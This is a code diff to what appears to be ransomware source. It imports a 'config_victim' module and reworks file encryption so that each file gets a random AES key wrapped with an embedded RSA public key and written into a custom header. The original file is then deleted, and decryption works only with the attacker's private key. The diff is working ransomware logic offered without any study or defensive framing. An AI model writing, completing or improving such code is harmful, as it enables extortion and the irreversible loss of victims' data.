@@ -3,58 +3,131 @@ from Cryptodome.PublicKey import RSA
 from Cryptodome.Util import Counter
 from Cryptodome.Random import get_random_bytes
 import os
+import struct
 
 from config_victim import (
     ENCRYPTION_EXTENSION, AES_KEY_SIZE, MAX_RETRIES,
-    validate_file_for_encryption, VICTIM_CONFIG
+    validate_file_for_encryption, VICTIM_CONFIG,
+    FILE_HEADER_MAGIC, FILE_FORMAT_VERSION, 
+    AES_KEY_SIZE_PER_FILE, NONCE_SIZE, PUBLIC_KEY
 )
 
 
-def encrypt_file_advanced(key, file_path, max_retries=MAX_RETRIES):
+def load_public_key_from_string():
+   
+    try:
+        public_key = RSA.import_key(PUBLIC_KEY.strip())
+        return public_key
+    except Exception as e:
+         # اومبعد ساهل
+        return None
+
+def load_private_key_from_string(private_key):
+   
+    try:
+        private_key = RSA.import_key(private_key.strip())
+        return private_key
+    except Exception:
+        return None
+
+
+
+
+def build_file_header(encrypted_aes_key, encrypted_nonce, original_size):
+    
+    header = b''
+    header += FILE_HEADER_MAGIC
+    header += struct.pack('>H', FILE_FORMAT_VERSION)
+    header += struct.pack('>H', 0)  # flags
+    header += struct.pack('>I', len(encrypted_aes_key))
+    header += struct.pack('>I', len(encrypted_nonce))
+    header += struct.pack('>Q', original_size)
+    header += encrypted_aes_key
+    header += encrypted_nonce
+    return header
+
+
+
+
+def parse_file_header(encrypted_file_path):
+    try:
+        with open(encrypted_file_path, 'rb') as f:
+            magic = f.read(4)
+            if magic != FILE_HEADER_MAGIC:
+                return None
+            
+            version = struct.unpack('>H', f.read(2))[0]
+            flags = struct.unpack('>H', f.read(2))[0]
+            aes_key_size = struct.unpack('>I', f.read(4))[0]
+            nonce_size = struct.unpack('>I', f.read(4))[0]
+            original_size = struct.unpack('>Q', f.read(8))[0]
+            
+            encrypted_aes_key = f.read(aes_key_size)
+            encrypted_nonce = f.read(nonce_size)
+            encrypted_data = f.read()
+            
+            return {
+                'version': version,
+                'encrypted_aes_key': encrypted_aes_key,
+                'encrypted_nonce': encrypted_nonce,
+                'original_size': original_size,
+                'encrypted_data': encrypted_data
+            }
+    except Exception:
+        return None
+
+
+
+
+
+
+def encrypt_file_advanced(file_path, max_retries=MAX_RETRIES):
+    
     original_file_size = 0
-    nonce = None
-    temp_files_created = []
     
     try:
         if not validate_file_for_encryption(file_path):
+            return False
+        
+       
+        public_key = load_public_key_from_string()
+        if not public_key:
             return False
         
         original_file_size = os.path.getsize(file_path)
         
         for attempt in range(max_retries + 1):
             try:
-                nonce = get_random_bytes(8)
-                counter = Counter.new(64, prefix=nonce)
-                cipher = AES.new(key, AES.MODE_CTR, counter=counter)
+              
+                file_aes_key = get_random_bytes(AES_KEY_SIZE_PER_FILE)
+                file_nonce = get_random_bytes(NONCE_SIZE)
                 
-                temp_encrypted = file_path + '.tmp_enc'
-                temp_files_created.append(temp_encrypted)
                 
-                with open(file_path, 'rb') as original_file, open(temp_encrypted, 'wb') as encrypted_file:
-                    chunk_size = 8192
-                    
-                    while True:
-                        chunk = original_file.read(chunk_size)
-                        if not chunk:
-                            break
-                        encrypted_chunk = cipher.encrypt(chunk)
-                        encrypted_file.write(encrypted_chunk)
+                counter = Counter.new(64, prefix=file_nonce)
+                cipher = AES.new(file_aes_key, AES.MODE_CTR, counter=counter)
                 
-                encrypted_size = os.path.getsize(temp_encrypted)
-                if encrypted_size != original_file_size:
-                    raise ValueError("Encrypted file size mismatch")
+                with open(file_path, 'rb') as original_file:
+                    file_data = original_file.read()
                 
-                os.replace(temp_encrypted, file_path)
+                encrypted_data = cipher.encrypt(file_data)
                 
-                nonce_file = file_path + '.nonce'
-                with open(nonce_file, 'wb') as nf:
-                    nf.write(nonce)
-                temp_files_created.append(nonce_file)
+               
+                cipher_rsa = PKCS1_OAEP.new(public_key)
+                encrypted_aes_key = cipher_rsa.encrypt(file_aes_key)
+                encrypted_nonce = cipher_rsa.encrypt(file_nonce)
                 
-                final_name = file_path + ENCRYPTION_EXTENSION
-                os.rename(file_path, final_name)
+              
+                header = build_file_header(encrypted_aes_key, encrypted_nonce, original_file_size)
+                encrypted_file_path = file_path + ENCRYPTION_EXTENSION
                 
-                if verify_encryption_integrity(final_name, nonce_file, original_file_size):
+                with open(encrypted_file_path, 'wb') as encrypted_file:
+                    encrypted_file.write(header)
+                    encrypted_file.write(encrypted_data)
+                
+              
+                os.remove(file_path)
+                
+                if verify_encryption_integrity(encrypted_file_path, original_file_size):
                     return True
                 else:
                     raise ValueError("Encryption integrity check failed")
@@ -62,67 +135,78 @@ def encrypt_file_advanced(key, file_path, max_retries=MAX_RETRIES):
             except Exception as attempt_error:
                 if attempt == max_retries:
                     raise attempt_error
-                cleanup_temp_files(temp_files_created)
-                temp_files_created = []
                 continue
                 
-    except Exception:
-        cleanup_temp_files(temp_files_created)
+    except Exception as e:
+        # اومبغد ساهل 
         return False
         
     finally:
-        secure_delete(nonce)
-        cleanup_temp_files([f for f in temp_files_created if os.path.exists(f)])
+     
+        if 'file_aes_key' in locals():
+            secure_delete(file_aes_key)
+        if 'file_nonce' in locals():
+            secure_delete(file_nonce)
 
 
-        
 
-def decrypt_file_advanced(key, encrypted_file_path):
+
+
+
+def decrypt_file_advanced(encrypted_file_path, private_key_pem=None):
+
     try:
-        original_name = encrypted_file_path.replace(ENCRYPTION_EXTENSION, '')
-        nonce_file = original_name + '.nonce'
-        
-        if not os.path.exists(nonce_file):
+        file_data = parse_file_header(encrypted_file_path)
+        if not file_data:
             return False
         
-        with open(nonce_file, 'rb') as nf:
-            nonce = nf.read()
+        if private_key_pem is None:
+           # اومبعد ساهل 
+            return False
+        
+      
+        private_key = load_private_key_from_string(private_key_pem)
+        if not private_key:
+            return False
+        
+       
+        cipher_rsa = PKCS1_OAEP.new(private_key)
+        aes_key = cipher_rsa.decrypt(file_data['encrypted_aes_key'])
+        nonce = cipher_rsa.decrypt(file_data['encrypted_nonce'])
+        
         
         counter = Counter.new(64, prefix=nonce)
-        cipher = AES.new(key, AES.MODE_CTR, counter=counter)
+        cipher = AES.new(aes_key, AES.MODE_CTR, counter=counter)
+        decrypted_data = cipher.decrypt(file_data['encrypted_data'])
         
-        if os.path.exists(encrypted_file_path):
-            with open(encrypted_file_path, 'r+b') as f:
-                chunk_size = 4096
-                ciphertext = f.read(chunk_size)
-                f.seek(0)
-                
-                while ciphertext:
-                    plaintext = cipher.encrypt(ciphertext)
-                    f.write(plaintext)
-                    ciphertext = f.read(chunk_size)
-            
-            os.rename(encrypted_file_path, original_name)
-            os.remove(nonce_file)
-            return True
-            
+        
+        original_path = encrypted_file_path.replace(ENCRYPTION_EXTENSION, '')
+        with open(original_path, 'wb') as f:
+            f.write(decrypted_data)
+        
+      
+        os.remove(encrypted_file_path)
+        return True
+        
     except Exception as e:
-        return False  
+        
+        return False
+    
 
-
-
-
-def verify_encryption_integrity(encrypted_file, nonce_file, original_size):
+def verify_encryption_integrity(encrypted_file, original_size):
+   
     try:
-        if not os.path.exists(encrypted_file) or not os.path.exists(nonce_file):
+        file_data = parse_file_header(encrypted_file)
+        if not file_data:
             return False
         
-        encrypted_size = os.path.getsize(encrypted_file)
+        encrypted_size = len(file_data['encrypted_data'])
         return encrypted_size == original_size
         
     except Exception:
-        return False  
-    
+        return False    
+
+
 
 
 
@@ -134,6 +218,7 @@ def cleanup_temp_files(file_list):
                 os.remove(file_path)
         except Exception:
             continue
+
 
 
 
